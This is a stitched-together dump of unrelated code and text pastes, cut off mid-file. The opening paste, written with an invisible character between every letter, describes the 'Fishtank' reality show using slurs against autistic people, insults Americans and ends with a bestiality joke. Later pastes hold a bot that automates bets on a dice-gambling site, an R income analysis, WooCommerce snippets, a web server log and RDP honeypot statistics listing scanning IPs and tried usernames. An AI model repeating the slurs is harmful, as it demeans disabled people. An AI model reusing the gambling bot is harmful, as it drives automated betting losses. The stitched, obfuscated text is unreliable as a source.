F‎i‎s‎h‎t‎a‎n‎k‎,‎ ‎a‎l‎s‎o‎ ‎c‎a‎l‎l‎e‎d‎ ‎F‎i‎s‎h‎t‎a‎n‎k‎ ‎L‎i‎v‎e‎ ‎i‎s‎ ‎a‎n‎ ‎i‎n‎t‎e‎r‎w‎e‎b‎z‎-‎h‎o‎s‎t‎e‎d‎ ‎""‎r‎e‎a‎l‎i‎t‎y‎ ‎s‎h‎o‎w‎""‎/‎""‎g‎a‎m‎e‎ ‎s‎h‎o‎w‎""‎ ‎f‎o‎u‎n‎d‎e‎d‎ ‎i‎n‎ ‎2‎0‎2‎3‎ ‎b‎y‎ ‎A‎m‎e‎r‎i‎c‎u‎n‎t‎ ‎c‎o‎m‎e‎d‎y‎ ‎h‎a‎c‎k‎ ‎(‎a‎n‎d‎ ‎n‎o‎t‎o‎r‎i‎o‎u‎s‎ ‎t‎e‎r‎r‎o‎r‎i‎s‎t‎)‎ ‎S‎a‎m‎ ‎H‎y‎d‎e‎,‎ ‎e‎r‎,‎ ‎""‎J‎a‎s‎o‎n‎ ‎G‎o‎l‎d‎s‎t‎r‎i‎k‎e‎r‎""‎ ‎a‎n‎d‎ ‎m‎e‎d‎i‎a‎ ‎p‎r‎o‎d‎u‎c‎e‎r‎ ‎J‎e‎t‎ ‎N‎e‎p‎t‎u‎n‎e‎.‎ ‎T‎h‎e‎ ‎b‎a‎s‎i‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎s‎h‎o‎w‎ ‎i‎s‎ ‎t‎h‎e‎ ‎d‎r‎e‎a‎m‎ ‎o‎f‎ ‎e‎v‎e‎r‎y‎ ‎O‎G‎-‎s‎t‎y‎l‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎ ‎t‎r‎o‎l‎l‎ ‎a‎n‎d‎ ‎l‎o‎l‎c‎o‎w‎ ‎e‎n‎t‎h‎u‎s‎i‎a‎s‎t‎:‎ ‎G‎e‎t‎ ‎a‎ ‎b‎u‎n‎c‎h‎ ‎o‎f‎ ‎a‎u‎t‎i‎s‎t‎s‎ ‎t‎o‎g‎e‎t‎h‎e‎r‎ ‎I‎R‎L‎ ‎i‎n‎ ‎a‎ ‎h‎o‎u‎s‎e‎,‎ ‎r‎e‎m‎o‎v‎e‎ ‎t‎h‎e‎i‎r‎ ‎p‎h‎o‎n‎e‎s‎,‎ ‎a‎n‎d‎ ‎f‎o‎r‎c‎e‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎c‎o‎m‎p‎e‎t‎e‎ ‎i‎n‎ ‎d‎e‎p‎r‎a‎v‎e‎d‎ ‎c‎h‎a‎l‎l‎e‎n‎g‎e‎s‎ ‎f‎o‎r‎ ‎""‎m‎o‎n‎e‎y‎""‎,‎ ‎w‎h‎i‎l‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎o‎n‎l‎i‎n‎e‎ ‎w‎a‎t‎c‎h‎ ‎t‎h‎e‎ ‎l‎u‎l‎z‎ ‎e‎n‎s‎u‎e‎.‎ ‎T‎h‎e‎ ‎i‎n‎i‎t‎i‎a‎l‎ ‎p‎r‎i‎z‎e‎ ‎o‎f‎f‎e‎r‎e‎d‎ ‎(‎i‎n‎ ‎S‎e‎a‎s‎o‎n‎ ‎1‎)‎ ‎t‎o‎ ‎t‎h‎e‎ ‎u‎n‎l‎u‎c‎k‎y‎ ‎""‎w‎i‎n‎n‎e‎r‎""‎ ‎w‎a‎s‎ ‎a‎ ‎m‎e‎r‎e‎ ‎$‎1‎0‎,‎0‎0‎0‎.‎0‎0‎ ‎o‎f‎ ‎'‎M‎u‎r‎i‎c‎a‎n‎ ‎m‎o‎n‎e‎y‎ ‎(‎w‎h‎i‎c‎h‎ ‎i‎s‎n‎'‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎t‎h‎a‎t‎ ‎m‎u‎c‎h‎)‎ ‎-‎ ‎b‎u‎t‎ ‎i‎t‎ ‎w‎a‎s‎ ‎e‎v‎e‎n‎t‎u‎a‎l‎l‎y‎ ‎u‎p‎p‎e‎d‎ ‎t‎o‎ ‎$‎3‎0‎K‎ ‎U‎S‎D‎.‎ ‎T‎h‎i‎s‎ ‎s‎h‎i‎t‎s‎h‎o‎w‎ ‎l‎a‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎j‎u‎s‎t‎ ‎a‎ ‎b‎i‎t‎ ‎u‎n‎d‎e‎r‎ ‎t‎w‎o‎ ‎m‎o‎n‎t‎h‎s‎ ‎i‎n‎ ‎2‎0‎2‎3‎ ‎b‎e‎f‎o‎r‎e‎ ‎e‎n‎d‎i‎n‎g‎ ‎i‎t‎s‎ ‎f‎i‎r‎s‎t‎ ‎s‎e‎a‎s‎o‎n‎.‎ ‎A‎ ‎s‎e‎c‎o‎n‎d‎ ‎s‎e‎a‎s‎o‎n‎ ‎b‎e‎g‎a‎n‎ ‎i‎n‎ ‎D‎e‎c‎e‎m‎b‎e‎r‎ ‎2‎0‎2‎3‎ ‎a‎n‎d‎ ‎i‎s‎ ‎f‎i‎n‎a‎l‎l‎y‎ ‎a‎b‎o‎u‎t‎ ‎t‎o‎ ‎e‎n‎d‎ ‎-‎ ‎W‎H‎O‎ ‎W‎I‎L‎L‎ ‎W‎I‎N‎ ‎S‎E‎A‎S‎O‎N‎ ‎2‎?‎?‎?‎


(‎(‎ ‎W‎H‎O‎ ‎W‎I‎L‎L‎ ‎""‎W‎I‎N‎""‎ ‎T‎H‎I‎S‎ ‎S‎E‎A‎S‎O‎N‎?‎?‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎b‎a‎n‎d‎e‎d‎ ‎d‎e‎m‎o‎i‎s‎e‎l‎l‎e‎ ‎(‎C‎a‎l‎o‎p‎t‎e‎r‎y‎x‎ ‎s‎p‎l‎e‎n‎d‎e‎n‎s‎)‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎d‎a‎m‎s‎e‎l‎f‎l‎y‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎C‎a‎l‎o‎p‎t‎e‎r‎y‎g‎i‎d‎a‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎ ‎E‎u‎r‎a‎s‎i‎a‎n‎ ‎s‎p‎e‎c‎i‎e‎s‎,‎ ‎o‎c‎c‎u‎r‎r‎i‎n‎g‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎c‎o‎a‎s‎t‎ ‎e‎a‎s‎t‎w‎a‎r‎d‎s‎ ‎t‎o‎ ‎L‎a‎k‎e‎ ‎B‎a‎i‎k‎a‎l‎ ‎a‎n‎d‎ ‎n‎o‎r‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎C‎h‎i‎n‎a‎.‎ ‎O‎f‎t‎e‎n‎ ‎f‎o‎u‎n‎d‎ ‎a‎l‎o‎n‎g‎ ‎s‎l‎o‎w‎-‎f‎l‎o‎w‎i‎n‎g‎ ‎s‎t‎r‎e‎a‎m‎s‎ ‎a‎n‎d‎ ‎r‎i‎v‎e‎r‎s‎,‎ ‎i‎t‎ ‎i‎s‎ ‎a‎ ‎c‎o‎m‎m‎o‎n‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎t‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎m‎u‎c‎h‎ ‎o‎f‎ ‎i‎t‎s‎ ‎r‎a‎n‎g‎e‎.‎ ‎T‎h‎i‎s‎ ‎m‎a‎l‎e‎ ‎b‎a‎n‎d‎e‎d‎ ‎d‎e‎m‎o‎i‎s‎e‎l‎l‎e‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎a‎t‎ ‎F‎a‎r‎m‎o‎o‎r‎ ‎i‎n‎ ‎O‎x‎f‎o‎r‎d‎s‎h‎i‎r‎e‎,‎ ‎E‎n‎g‎l‎a‎n‎d‎,‎ ‎n‎e‎a‎r‎ ‎t‎h‎e‎ ‎R‎i‎v‎e‎r‎ ‎T‎h‎a‎m‎e‎s‎.‎ ‎M‎a‎l‎e‎s‎ ‎h‎a‎v‎e‎ ‎a‎ ‎d‎a‎r‎k‎ ‎w‎i‎n‎g‎ ‎p‎a‎t‎c‎h‎ ‎t‎h‎a‎t‎ ‎s‎t‎a‎r‎t‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎n‎o‎d‎u‎s‎ ‎b‎u‎t‎ ‎c‎a‎n‎ ‎r‎e‎a‎c‎h‎ ‎u‎p‎ ‎t‎o‎ ‎t‎h‎e‎ ‎w‎i‎n‎g‎ ‎t‎i‎p‎ ‎i‎n‎ ‎s‎o‎u‎t‎h‎e‎r‎n‎ ‎r‎a‎c‎e‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎f‎u‎c‎k‎ ‎m‎y‎ ‎d‎o‎g‎.‎ ‎D‎o‎g‎g‎y‎s‎t‎y‎l‎e‎.‎"
xyZd4ugX,snowybot 7777,coinwalk,JavaScript,Sunday 4th of February 2024 08:54:06 PM CDT,"var original = parseFloat(document.getElementById('pct_balance').value);
var blast = 0.00001;
var tens = (blast*10);
var bilance = original;
var sevens = (blast*6.9);
var eights = (blast*7.9);
var nob = (blast*3);
var surigret = blast;
var forky = 0;
var bob = original;
var havot = original;
var telf = original;
var mighty = blast;
var inpoo = parseFloat(surigret);
var idios = (bilance-bob);
var frock = (blast*2);
var vimot = Math.floor(idios/frock);
var freak = freak = Math.floor(vimot/5);
var hectic = ((Math.floor(freak/2))*2);
var bocker = (hectic*blast);
var bolux = (inpoo-bocker);
var mighty = (bocker+bolux);
 
function dobet() {
bilance = parseFloat(document.getElementById('pct_balance').value);
if ((bilance>(((Math.floor(bilance/tens))*tens)+sevens))&&(bilance<(((Math.floor(bilance/tens))*tens)+eights))&&(bilance!=forky)){
     forky = parseFloat(bilance);
     surigret = surigret*2;
} 
if (bilance>telf){
telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance>bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    inpoo = parseFloat(surigret);
    idios = (bob-bilance);
    vimot = Math.floor(idios/frock);
    freak = freak = Math.floor(vimot/5);
    hectic = ((Math.floor(freak/2))*2);
    bocker = (hectic*blast);
    bolux = (inpoo-bocker);
    mighty = (bocker+bolux);
    forky = 0;
    if (mighty<blast){
        mighty = blast;
        }
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance<telf)&&(bilance<bob)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    mighty = blast;
    surigret = mighty;  
    telf = parseFloat(bilance);
}
if (((surigret*40)>=bilance)&&(bilance>=telf)&&(bilance<(((Math.floor(bilance/tens))*tens)+sevens))){
    forky = 0;
    surigret = blast;
    telf = parseFloat(bilance);
}
    if (bilance>=(original*7)) {
    console.log(""winner winner chicken dinner"");
    return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(surigret);
$('#a_lo').click();
setTimeout(() => dobet(), 1000);
} 
dobet();
"
jXskhuTN,Ingreso Monetario Adultos mayores,yayopoint,R,Sunday 4th of February 2024 08:12:35 PM CDT,"# Librerías ---------------------------------------------------------------

library(tidyverse)
library(haven)
library(survey)
library(magrittr, include.only = ""%<>%"")
library(scales)
library(ggpubr)

# Cargar base de datos ----------------------------------------------------

# Se lee la base de datos 
casen2022 <- read_spss(""datos/2022/Base de datos Casen 2022 SPSS.sav"")

# Filtrar y procesar ------------------------------------------------------

# Se filtra los adultos mayores
casen2022 %<>%
  filter(edad >= 65)

# Se aplica el diseño muestral
svycasen2022 <- svydesign(ids=~1, weights=~expr, data=casen2022)

# Se calcula los deciles de ingreso monetario
deciles <- svyquantile(~ymonecor, svycasen2022, seq(0,1,len=11), na.rm=TRUE)

# Se crea la variable deciles de ingreso monetario:
svycasen2022$variables %<>%
  mutate(ymonecor_deciles = cut(ymonecor,
                                deciles$ymonecor[,""quantile""],
                                include.lowest=TRUE,
                                labels=paste(""Decil"", as.roman(1:10))),
         sexo=as_factor(sexo))

# Tabla 1: Ingreso monetario corregido según decil de ingreso y sexo
tab1 <- svyby(~ymonecor, ~ymonecor_deciles+sexo, svycasen2022, svymean)

# Tabla 1 con sexo en las columnas y deciles en las filas
xtabs(ymonecor~ymonecor_deciles+sexo, data=tab1) %>%
  format(digits=2, big.mark=""."", decimal.mark="","") -> tab1.1

# Tabla 1 para el gráfico
tab1.1_g <- ggtexttable(tab1.1)

# Se genera gráfico de columnas
grafico1 <- svyby(~ymonecor, ~ymonecor_deciles+sexo, svycasen2022, svymean) %>%
  ggplot() +
  aes(x=ymonecor_deciles, y=ymonecor, fill=sexo) +
  geom_col(position=""dodge"") +
  scale_y_continuous(labels=label_number(scale=1e-3, prefix=""$"", suffix=""m"")) +
  labs(title=""Promedio ingreso monetario corregido promedio en mayores de 65 años"",
       subtitle=""Según decil de ingreso monetario y Sexo"",
       y=""Ingreso monetario corregido\n(en miles de pesos)"",
       x=""Decil de ingreso monetario"",
       caption=""Autor: Andrés Necochea\nFuente:Elaboración propia en base a datos de CASEN 2022"")

# Se agrega la tabla al gráfico 1
grafico1 +
  annotation_custom(ggplotGrob(tab1.1_g), ymin=500000, ymax=1500000, xmin=1, xmax=3)
"
QSQ1VuaX,"WooCommerce Deposits:  Remove the Partial Payments Summary from the ""My Account"" page",YordanSoares,PHP,Sunday 4th of February 2024 07:52:38 PM CDT,"<?php
/**
 * WooCommerce Deposits:
 * Remove the Partial Payments Summary from the ""My Account"" page
 */
add_filter( 'wc_deposits_myaccount_show_partial_payments_summary', '__return_false' );"
Akpu26fA,"WooCommerce Deposits:  Remove the Partial Payments Summary from the ""Thank you"" page",YordanSoares,PHP,Sunday 4th of February 2024 07:51:16 PM CDT,"<?php
/**
 * WooCommerce Deposits:
 * Remove the Partial Payments Summary from the ""Thank you"" page
 */
add_filter( 'wc_deposits_thankyou_show_partial_payments_summary', '__return_false' );"
ZzYKhyuK,WooCommerce Deposits:  Remove the Partial Payments Summary from the email notifications,YordanSoares,PHP,Sunday 4th of February 2024 07:50:25 PM CDT,"<?php
/**
 * WooCommerce Deposits:
 * Remove the Partial Payments Summary from the email notifications
 */
add_filter( 'wc_deposits_email_show_partial_payments_summary', '__return_false' );"
Jyv4pEHQ,"WooCommerce Deposits:  Remove the total deposits row from the ""Checkout"" page",YordanSoares,PHP,Sunday 4th of February 2024 07:49:30 PM CDT,"<?php
/**
 * WooCommerce Deposits:
 * Remove the total deposits row from the ""Checkout"" page
 */
add_filter( 'wc_deposits_cart_display_ui', '__return_false' );"
00XYpq1w,Untitled,jl_678,JSON,Sunday 4th of February 2024 06:26:25 PM CDT,"2024/02/04 22:02:48.846 error   http.log.access.log4    handled request {""request"": {""remote_ip"": ""<IP>"", ""remote_port"": ""46756"", ""client_ip"": ""<IP>"", ""proto"": ""HTTP/2.0"", ""method"": ""GET"", ""host"": ""<URL>"", ""uri"": ""/favicon.ico"", ""headers"": {""Cdn-Loop"": [""cloudflare""], ""Accept-Encoding"": [""gzip""], ""X-Forwarded-Proto"": [""https""], ""Sec-Ch-Ua-Platform"": [""\""Chrome OS\""""], ""Cf-Ipcountry"": [""US""], ""Cf-Ray"": [""85063337393042e0-EWR""], ""User-Agent"": [""Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36""], ""Sec-Fetch-Mode"": [""no-cors""], ""Referer"": [""<URL>""], ""Cf-Connecting-Ip"": [""<IP>""], ""X-Forwarded-For"": [""<IP>""], ""Cf-Visitor"": [""{\""scheme\"":\""https\""}""], ""Sec-Fetch-Site"": [""same-origin""], ""Sec-Fetch-Dest"": [""image""], ""Authorization"": [], ""Sec-Ch-Ua"": [""\""Not_A Brand\"";v=\""8\"", \""Chromium\"";v=\""120\"", \""Google Chrome\"";v=\""120\""""], ""Dnt"": [""1""], ""Sec-Ch-Ua-Mobile"": [""?0""], ""Accept"": [""image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8""], ""Accept-Language"": [""en-US,en;q=0.9""], ""Priority"": [""u=1, i""]}, ""tls"": {""resumed"": false, ""version"": 772, ""cipher_suite"": 4865, ""proto"": ""h2"", ""server_name"": ""<URL>""}}, ""bytes_read"": 0, ""user_id"": ""bob1"", ""duration"": 0.000848764, ""size"": 22, ""status"": 400, ""resp_headers"": {""Content-Length"": [""22""], ""Content-Type"": [""text/plain; charset=utf-8""], ""Server"": [""Caddy""], ""Alt-Svc"": [""h3=\"":443\""; ma=2592000""], ""Date"": [""Sun, 04 Feb 2024 22:02:48 GMT""]}}"
AD5WgTSn,2024-02-04_stats.json,rdp_snitch,JSON,Sunday 4th of February 2024 06:18:22 PM CDT,"{
  ""ip"": {
    ""179.43.133.211"": 3,
    ""194.165.16.11"": 6,
    ""106.116.169.71"": 6,
    ""45.227.254.49"": 6,
    ""91.240.118.29"": 6,
    ""205.210.31.40"": 9,
    ""117.102.70.35"": 3,
    ""196.190.117.7"": 6,
    ""87.251.75.145"": 6,
    ""120.240.145.8"": 3,
    ""171.226.227.85"": 3,
    ""113.200.79.70"": 3,
    ""185.170.144.3"": 6,
    ""45.227.254.8"": 6,
    ""198.235.24.112"": 9,
    ""45.227.254.26"": 6,
    ""81.19.135.2"": 9,
    ""62.204.41.195"": 12,
    ""173.237.25.68"": 6,
    ""80.66.76.92"": 9,
    ""152.32.183.13"": 3,
    ""2.57.149.186"": 6,
    ""43.129.180.247"": 153,
    ""167.94.145.54"": 3,
    ""198.235.24.255"": 9,
    ""13.68.210.18"": 3,
    ""167.94.138.35"": 3,
    ""173.239.218.80"": 3,
    ""194.165.16.73"": 6,
    ""129.226.147.239"": 3,
    ""194.165.16.78"": 6,
    ""173.239.218.23"": 3,
    ""198.235.24.254"": 9
  },
  ""asn"": {
    ""AS51852"": 3,
    ""AS48721"": 18,
    ""AS4134"": 6,
    ""AS267784"": 18,
    ""AS57523"": 6,
    ""AS396982"": 36,
    ""AS38482"": 3,
    ""AS24757"": 6,
    ""AS208091"": 15,
    ""AS56040"": 3,
    ""AS7552"": 3,
    ""AS4837"": 3,
    ""AS197414"": 6,
    ""AS209588"": 9,
    ""AS59425"": 12,
    ""AS7979"": 6,
    ""AS135377"": 3,
    ""AS208312"": 6,
    ""AS132203"": 156,
    ""AS398705"": 3,
    ""AS8075"": 3,
    ""AS398324"": 3,
    ""AS62240"": 6
  },
  ""isp"": {
    ""Private Layer INC"": 3,
    ""Flyservers S.A."": 45,
    ""Chinanet"": 6,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Google LLC"": 36,
    ""Biznet Networks"": 3,
    ""Ethiotelecom"": 6,
    ""Xhost Internet Solutions LP"": 21,
    ""China Mobile communications corporation"": 3,
    ""Viettel Corporation"": 3,
    ""CNC Group CHINA169 Shannxi Province Network"": 3,
    ""Horizon LLC"": 12,
    ""Servers.com, Inc."": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Red Byte LLC"": 6,
    ""Aceville Pte.ltd"": 153,
    ""Censys, Inc."": 6,
    ""Microsoft Corporation"": 3,
    ""LogicWeb Inc."": 6,
    ""Tencent Cloud Computing (Beijing) Co"": 3
  },
  ""org"": {
    ""Private Layer Inc"": 3,
    ""Flyservers S.A"": 18,
    ""Chinanet HE"": 6,
    ""UAB Host Baltic"": 18,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Pengadilan Agama KLS 1A Bandung"": 3,
    ""Unknown"": 165,
    ""Xhost Internet Solutions"": 15,
    ""China Mobile"": 3,
    ""VIETEL"": 3,
    ""Xhostis"": 6,
    ""Alviva Holding Limited"": 9,
    ""Horizon LLC"": 12,
    ""Servers.com, Inc."": 6,
    ""Ucloud Information Technology"": 3,
    ""Censys, Inc."": 3,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Censys, Inc"": 3,
    ""NSQ-VENTURE"": 6
  },
  ""regionName"": {
    ""Zurich"": 3,
    ""Kaunas"": 18,
    ""Hebei"": 6,
    ""Vilnius"": 18,
    ""Moscow"": 18,
    ""California"": 42,
    ""West Java"": 3,
    ""Addis Ababa"": 6,
    ""North Holland"": 21,
    ""Guangdong"": 3,
    ""Ho Chi Minh"": 3,
    ""Shaanxi"": 3,
    ""Hesse"": 12,
    ""Texas"": 6,
    ""Virginia"": 6,
    ""Lesser Poland"": 6,
    ""Central and Western District"": 153,
    ""Michigan"": 3,
    ""North West"": 3
  },
  ""country"": {
    ""Switzerland"": 3,
    ""Lithuania"": 36,
    ""China"": 12,
    ""Russia"": 18,
    ""United States"": 57,
    ""Indonesia"": 3,
    ""Ethiopia"": 6,
    ""The Netherlands"": 21,
    ""Vietnam"": 3,
    ""Germany"": 12,
    ""Poland"": 6,
    ""Hong Kong"": 153,
    ""Singapore"": 3
  },
  ""account"": {
    ""Administr"": 30,
    ""Test"": 48,
    ""(empty)"": 24,
    ""jAjKUapcW"": 3,
    ""izUcUJ"": 3,
    ""IUiOOl"": 3,
    ""hello"": 165,
    ""a"": 3,
    ""etAbWGeaJ"": 3,
    ""KfJkxc"": 3,
    ""fXsOhr"": 3,
    ""Domain"": 21,
    ""Administrator"": 3,
    ""eXWQroFvp"": 3,
    ""kRuQzG"": 3,
    ""uQHafB"": 3,
    ""pamn"": 3,
    ""QePqZqiBx"": 3,
    ""VkHrdj"": 3,
    ""ehXxFN"": 3
  },
  ""keyboard"": {
    ""Unknown"": 333
  },
  ""client_build"": {
    ""Unknown"": 333
  },
  ""client_name"": {
    ""Unknown"": 333
  },
  ""ip_type"": {
    ""hosting"": 207,
    ""Unknown"": 111,
    ""proxy"": 6,
    ""mobile"": 3,
    ""hosting & proxy"": 6
  }
}"
drwhweW6,2024-02-04_stats.json,rdp_snitch,JSON,Sunday 4th of February 2024 06:16:09 PM CDT,"{
  ""ip"": {
    ""179.43.133.211"": 2,
    ""194.165.16.11"": 4,
    ""106.116.169.71"": 4,
    ""45.227.254.49"": 4,
    ""91.240.118.29"": 4,
    ""205.210.31.40"": 6,
    ""117.102.70.35"": 2,
    ""196.190.117.7"": 4,
    ""87.251.75.145"": 4,
    ""120.240.145.8"": 2,
    ""171.226.227.85"": 2,
    ""113.200.79.70"": 2,
    ""185.170.144.3"": 4,
    ""45.227.254.8"": 4,
    ""198.235.24.112"": 6,
    ""45.227.254.26"": 4,
    ""81.19.135.2"": 6,
    ""62.204.41.195"": 8,
    ""173.237.25.68"": 4,
    ""80.66.76.92"": 6,
    ""152.32.183.13"": 2,
    ""2.57.149.186"": 4,
    ""43.129.180.247"": 102,
    ""167.94.145.54"": 2,
    ""198.235.24.255"": 6,
    ""13.68.210.18"": 2,
    ""167.94.138.35"": 2,
    ""173.239.218.80"": 2,
    ""194.165.16.73"": 4,
    ""129.226.147.239"": 2,
    ""194.165.16.78"": 4,
    ""173.239.218.23"": 2,
    ""198.235.24.254"": 6
  },
  ""asn"": {
    ""AS51852"": 2,
    ""AS48721"": 12,
    ""AS4134"": 4,
    ""AS267784"": 12,
    ""AS57523"": 4,
    ""AS396982"": 24,
    ""AS38482"": 2,
    ""AS24757"": 4,
    ""AS208091"": 10,
    ""AS56040"": 2,
    ""AS7552"": 2,
    ""AS4837"": 2,
    ""AS197414"": 4,
    ""AS209588"": 6,
    ""AS59425"": 8,
    ""AS7979"": 4,
    ""AS135377"": 2,
    ""AS208312"": 4,
    ""AS132203"": 104,
    ""AS398705"": 2,
    ""AS8075"": 2,
    ""AS398324"": 2,
    ""AS62240"": 4
  },
  ""isp"": {
    ""Private Layer INC"": 2,
    ""Flyservers S.A."": 30,
    ""Chinanet"": 4,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Google LLC"": 24,
    ""Biznet Networks"": 2,
    ""Ethiotelecom"": 4,
    ""Xhost Internet Solutions LP"": 14,
    ""China Mobile communications corporation"": 2,
    ""Viettel Corporation"": 2,
    ""CNC Group CHINA169 Shannxi Province Network"": 2,
    ""Horizon LLC"": 8,
    ""Servers.com, Inc."": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Red Byte LLC"": 4,
    ""Aceville Pte.ltd"": 102,
    ""Censys, Inc."": 4,
    ""Microsoft Corporation"": 2,
    ""LogicWeb Inc."": 4,
    ""Tencent Cloud Computing (Beijing) Co"": 2
  },
  ""org"": {
    ""Private Layer Inc"": 2,
    ""Flyservers S.A"": 12,
    ""Chinanet HE"": 4,
    ""UAB Host Baltic"": 12,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Palo Alto Networks, Inc"": 24,
    ""Pengadilan Agama KLS 1A Bandung"": 2,
    ""Unknown"": 110,
    ""Xhost Internet Solutions"": 10,
    ""China Mobile"": 2,
    ""VIETEL"": 2,
    ""Xhostis"": 4,
    ""Alviva Holding Limited"": 6,
    ""Horizon LLC"": 8,
    ""Servers.com, Inc."": 4,
    ""Ucloud Information Technology"": 2,
    ""Censys, Inc."": 2,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Censys, Inc"": 2,
    ""NSQ-VENTURE"": 4
  },
  ""regionName"": {
    ""Zurich"": 2,
    ""Kaunas"": 12,
    ""Hebei"": 4,
    ""Vilnius"": 12,
    ""Moscow"": 12,
    ""California"": 28,
    ""West Java"": 2,
    ""Addis Ababa"": 4,
    ""North Holland"": 14,
    ""Guangdong"": 2,
    ""Ho Chi Minh"": 2,
    ""Shaanxi"": 2,
    ""Hesse"": 8,
    ""Texas"": 4,
    ""Virginia"": 4,
    ""Lesser Poland"": 4,
    ""Central and Western District"": 102,
    ""Michigan"": 2,
    ""North West"": 2
  },
  ""country"": {
    ""Switzerland"": 2,
    ""Lithuania"": 24,
    ""China"": 8,
    ""Russia"": 12,
    ""United States"": 38,
    ""Indonesia"": 2,
    ""Ethiopia"": 4,
    ""The Netherlands"": 14,
    ""Vietnam"": 2,
    ""Germany"": 8,
    ""Poland"": 4,
    ""Hong Kong"": 102,
    ""Singapore"": 2
  },
  ""account"": {
    ""Administr"": 20,
    ""Test"": 32,
    ""(empty)"": 16,
    ""jAjKUapcW"": 2,
    ""izUcUJ"": 2,
    ""IUiOOl"": 2,
    ""hello"": 110,
    ""a"": 2,
    ""etAbWGeaJ"": 2,
    ""KfJkxc"": 2,
    ""fXsOhr"": 2,
    ""Domain"": 14,
    ""Administrator"": 2,
    ""eXWQroFvp"": 2,
    ""kRuQzG"": 2,
    ""uQHafB"": 2,
    ""pamn"": 2,
    ""QePqZqiBx"": 2,
    ""VkHrdj"": 2,
    ""ehXxFN"": 2
  },
  ""keyboard"": {
    ""Unknown"": 222
  },
  ""client_build"": {
    ""Unknown"": 222
  },
  ""client_name"": {
    ""Unknown"": 222
  },
  ""ip_type"": {
    ""hosting"": 138,
    ""Unknown"": 74,
    ""proxy"": 4,
    ""mobile"": 2,
    ""hosting & proxy"": 4
  }
}"
43Z1gKLj,2024-02-04_stats.json,rdp_snitch,JSON,Sunday 4th of February 2024 06:15:08 PM CDT,"{
  ""ip"": {
    ""179.43.133.211"": 1,
    ""194.165.16.11"": 2,
    ""106.116.169.71"": 2,
    ""45.227.254.49"": 2,
    ""91.240.118.29"": 2,
    ""205.210.31.40"": 3,
    ""117.102.70.35"": 1,
    ""196.190.117.7"": 2,
    ""87.251.75.145"": 2,
    ""120.240.145.8"": 1,
    ""171.226.227.85"": 1,
    ""113.200.79.70"": 1,
    ""185.170.144.3"": 2,
    ""45.227.254.8"": 2,
    ""198.235.24.112"": 3,
    ""45.227.254.26"": 2,
    ""81.19.135.2"": 3,
    ""62.204.41.195"": 4,
    ""173.237.25.68"": 2,
    ""80.66.76.92"": 3,
    ""152.32.183.13"": 1,
    ""2.57.149.186"": 2,
    ""43.129.180.247"": 51,
    ""167.94.145.54"": 1,
    ""198.235.24.255"": 3,
    ""13.68.210.18"": 1,
    ""167.94.138.35"": 1,
    ""173.239.218.80"": 1,
    ""194.165.16.73"": 2,
    ""129.226.147.239"": 1,
    ""194.165.16.78"": 2,
    ""173.239.218.23"": 1,
    ""198.235.24.254"": 3
  },
  ""asn"": {
    ""AS51852"": 1,
    ""AS48721"": 6,
    ""AS4134"": 2,
    ""AS267784"": 6,
    ""AS57523"": 2,
    ""AS396982"": 12,
    ""AS38482"": 1,
    ""AS24757"": 2,
    ""AS208091"": 5,
    ""AS56040"": 1,
    ""AS7552"": 1,
    ""AS4837"": 1,
    ""AS197414"": 2,
    ""AS209588"": 3,
    ""AS59425"": 4,
    ""AS7979"": 2,
    ""AS135377"": 1,
    ""AS208312"": 2,
    ""AS132203"": 52,
    ""AS398705"": 1,
    ""AS8075"": 1,
    ""AS398324"": 1,
    ""AS62240"": 2
  },
  ""isp"": {
    ""Private Layer INC"": 1,
    ""Flyservers S.A."": 15,
    ""Chinanet"": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Google LLC"": 12,
    ""Biznet Networks"": 1,
